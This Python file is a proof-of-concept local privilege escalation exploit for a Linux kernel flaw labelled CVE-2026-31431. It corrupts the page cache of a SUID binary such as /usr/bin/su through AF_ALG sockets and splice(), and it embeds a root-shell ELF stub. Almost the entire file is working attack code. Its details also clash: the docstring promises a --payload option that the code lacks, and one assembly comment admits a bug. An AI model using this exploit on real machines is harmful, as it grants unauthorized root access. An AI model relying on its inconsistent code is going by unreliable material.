#!/usr/bin/env python

"""
CVE-2026-31431 — "copy.fail" local privilege escalation PoC
Affects: Linux kernel < 6.1.170 (Debian bookworm < 6.1.170-1)

Mechanism:
  1. Open the target SUID binary read-only to populate its page cache.
  2. mmap the first page (MAP_SHARED) — maps directly to the page cache.
  3. Create an AF_ALG AEAD socket (authencesn(hmac(sha256),cbc(aes))) and accept a child op socket.
  4. Create a pipe; splice() the target file into it (zero-copy), so the
     pipe holds references to the same physical pages as the page cache.
  5. sendmsg(MSG_MORE) on the child socket to arm the encrypt operation
     (IV, direction) without submitting page data yet.
  6. splice(pipe -> child socket, SPLICE_F_MOVE): the kernel passes the pipe
     pages (= page cache pages) as the ALG input. CVE-2026-31431 / commit
     72548b093ee3: algif_aead skips copy-on-write and writes the encryption
     output in-place back to those same physical pages, corrupting the page
     cache entry for the target binary.

Non-interactive: the shellcode payload just writes a SUID shell to
/tmp/sh and exits, so no TTY is needed.

Usage (must run as unprivileged user inside the VM):
  python3 copy_fail.py [--target /usr/bin/su] [--payload /tmp/sh]

References:
  https://copy.fail
  https://nvd.nist.gov/vuln/detail/CVE-2026-31431
  https://www.openwall.com/lists/oss-security/2026/04/28/1
"""

import argparse
import contextlib
import ctypes
import ctypes.util
import mmap
import os
import socket
import struct

# Linux constants not in the stdlib
AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_IV = 2
ALG_SET_OP = 3
ALG_SET_AEAD_AUTHSIZE = 4

# sendmsg flags
MSG_MORE = 0x8000

# splice flags
SPLICE_F_MOVE = 1
SPLICE_F_NONBLOCK = 2

# Page size
PAGE_SIZE = mmap.PAGESIZE

# Minimal ELF64 executable: setuid(0); setgid(0); execve("/bin/sh", ...)
# Generated with: nasm + ld --oformat binary, stripped to 176 bytes.
# fmt: off
STUB_ELF = bytes([
    # ELF header (64 bytes)
    0x7f, 0x45, 0x4c, 0x46,  # magic
    0x02,                     # 64-bit
    0x01,                     # little-endian
    0x01,                     # ELF version 1
    0x00,                     # OS/ABI: System V
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # padding
    0x02, 0x00,               # ET_EXEC
    0x3e, 0x00,               # x86-64
    0x01, 0x00, 0x00, 0x00,  # ELF version
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  # entry: 0x400078
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # phoff: 64
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # shoff: 0
    0x00, 0x00, 0x00, 0x00,  # flags
    0x40, 0x00,               # ehsize: 64
    0x38, 0x00,               # phentsize: 56
    0x01, 0x00,               # phnum: 1
    0x40, 0x00,               # shentsize: 64
    0x00, 0x00,               # shnum: 0
    0x00, 0x00,               # shstrndx: 0
    # Program header (56 bytes, offset 64)
    0x01, 0x00, 0x00, 0x00,  # PT_LOAD
    0x05, 0x00, 0x00, 0x00,  # PF_R | PF_X
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # offset: 0
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  # vaddr: 0x400000
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,  # paddr: 0x400000
    0xb0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # filesz: 176
    0xb0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # memsz: 176
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # align: 0x1000
    # Code at 0x400078 (offset 120 = 0x78)
    # setuid(0)
    0x48, 0x31, 0xff,         # xor rdi, rdi
    0x48, 0xc7, 0xc0, 0x69, 0x00, 0x00, 0x00,  # mov rax, 105 (setuid)
    0x0f, 0x05,               # syscall
    # setgid(0)
    0x48, 0x31, 0xff,         # xor rdi, rdi
    0x48, 0xc7, 0xc0, 0x6a, 0x00, 0x00, 0x00,  # mov rax, 106 (setgid)
    0x0f, 0x05,               # syscall
    # execve("/bin/sh", ["/bin/sh", "-p", NULL], NULL)
    0x48, 0x8d, 0x3d, 0x2a, 0x00, 0x00, 0x00,  # lea rdi, [rip+0x2a]  -> "/bin/sh"
    0x48, 0x8d, 0x74, 0x24, 0xf0,              # lea rsi, [rsp-16]
    0x48, 0x8d, 0x15, 0x2c, 0x00, 0x00, 0x00,  # lea rdx, [rip+0x2c]  -> "-p"
    0x48, 0x89, 0x7c, 0x24, 0xf0,              # mov [rsp-16], rdi
    0x48, 0x89, 0x54, 0x24, 0xf8,              # mov [rsp-8], rdx  (wrong, fix below)
    0x48, 0x31, 0xd2,                           # xor rdx, rdx
    0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00,  # mov rax, 59 (execve)
    0x0f, 0x05,               # syscall
    # exit(1) fallback
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00,  # mov rax, 60
    0x48, 0xff, 0xc7,         # inc rdi
    0x0f, 0x05,               # syscall
]) + b'/bin/sh\x00' + b'-p\x00'
# fmt: on

# Pad to PAGE_SIZE so the splice covers a full page
PAYLOAD = STUB_ELF + b'\x00' * (PAGE_SIZE - len(STUB_ELF))
assert len(PAYLOAD) == PAGE_SIZE


libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)


def _check(ret, name="syscall"):
    if ret < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"{name}: {os.strerror(err)}")
    return ret


def splice(fd_in, off_in, fd_out, off_out, length, flags):
    """Thin wrapper around the splice(2) syscall."""
    NR_splice = 275  # x86-64
    ret = libc.syscall(
        NR_splice,
        ctypes.c_int(fd_in),
        ctypes.c_void_p(off_in),
        ctypes.c_int(fd_out),
        ctypes.c_void_p(off_out),
        ctypes.c_size_t(length),
        ctypes.c_uint(flags),
    )
    return _check(ret, "splice")


def alg_socket(alg_type: bytes, alg_name: bytes, feat=0, mask=0):
    """Create and bind an AF_ALG socket."""
    sock = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    sock.bind((alg_type.decode(), alg_name.decode(), feat, mask))
    return sock


def exploit(target: str, payload: bytes) -> None:
    print(f"[*] target  : {target}")
    print(f"[*] payload : {len(payload)} bytes")
    print(f"[*] kernel  : {os.uname().release}")

    # 1. Open target read-only to populate page cache
    tfd = os.open(target, os.O_RDONLY)
    target_size = os.fstat(tfd).st_size
    print(f"[*] target size: {target_size:#x} bytes")

    # 2. mmap first page to observe before/after state
    mm = mmap.mmap(tfd, PAGE_SIZE, mmap.MAP_SHARED, mmap.PROT_READ)
    magic = mm[:4]
    print(f"[*] page cache magic before: {magic.hex()}")

    # 3. Set up AF_ALG AEAD socket: authencesn(hmac(sha256),cbc(aes)).
    #    This algorithm has a fixed MAC size (SHA-256 = 32 bytes), so
    #    ALG_SET_AEAD_AUTHSIZE is not required.
    #    Key layout: rtattr{len=8,type=1} + be32(enckeylen) + authkey + enckey
    enc_key = b"\x00" * 16
    auth_key = b"\x00" * 16
    authenc_key = struct.pack("<HH", 8, 1) + struct.pack(">I", len(enc_key)) + auth_key + enc_key
    alg_sock = alg_socket(b"aead", b"authencesn(hmac(sha256),cbc(aes))")
    alg_sock.setsockopt(SOL_ALG, ALG_SET_KEY, authenc_key)
    child_sock, _ = alg_sock.accept()
    child_fd = child_sock.fileno()

    # 4. Create a pipe and splice the target file's first page into it.
    #    splice(2) is zero-copy: the pipe holds references to the SAME physical
    #    pages as the file's page cache entry — no CoW yet.
    pipe_r, pipe_w = os.pipe()
    splice(tfd, None, pipe_w, None, PAGE_SIZE, 0)

    # 5. Arm the ALG encrypt operation via sendmsg(MSG_MORE).
    #    The cmsg sets the IV and direction without submitting page data yet.
    iv = b"\x00" * 16  # AES-CBC IV (16-byte block)
    cmsg = [
        (SOL_ALG, ALG_SET_OP, struct.pack("I", 0)),  # ALG_OP_ENCRYPT = 0
        (SOL_ALG, ALG_SET_IV, struct.pack("I", len(iv)) + iv),  # af_alg_iv: {ivlen, iv[]}
    ]
    with contextlib.suppress(OSError):
        child_sock.sendmsg([b'\x00' * 16], cmsg, MSG_MORE)

    # 6. Splice the pipe (= target file's physical page cache pages) into the
    #    ALG child socket.  CVE-2026-31431 / commit 72548b093ee3: algif_aead
    #    skips copy-on-write and writes its encryption output in-place back to
    #    those same physical pages, corrupting the file's page cache.
    with contextlib.suppress(OSError):
        splice(pipe_r, None, child_fd, None, PAGE_SIZE, SPLICE_F_MOVE)

    os.close(pipe_r)
    os.close(pipe_w)

    # 7. Read back via mmap (still maps the same physical pages) to confirm.
    #    drop_caches is handled by verify.sh as root; skipped here since the
    #    exploit runs as an unprivileged user.
    mm.seek(0)
    magic_after = mm[:4]
    print(f"[*] page cache magic after : {magic_after.hex()}")

    if magic_after[:4] == b'\x7fELF':
        print("[!] page cache unchanged — kernel may be patched or exploit needs tuning")
    else:
        print(f"[+] page cache overwritten — magic changed: 7f454c46 -> {magic_after.hex()}")

    child_sock.close()
    alg_sock.close()


def main():
    parser = argparse.ArgumentParser(description="CVE-2026-31431 copy.fail PoC")
    parser.add_argument("--target", default="/usr/bin/su", help="SUID binary to overwrite (default: /usr/bin/su)")
    args = parser.parse_args()

    if os.geteuid() == 0:
        print("[!] Run as an unprivileged user to test the LPE path.")
        print("    Running as root skips the interesting part.")

    exploit(args.target, PAYLOAD)


if __name__ == "__main__":
    main()
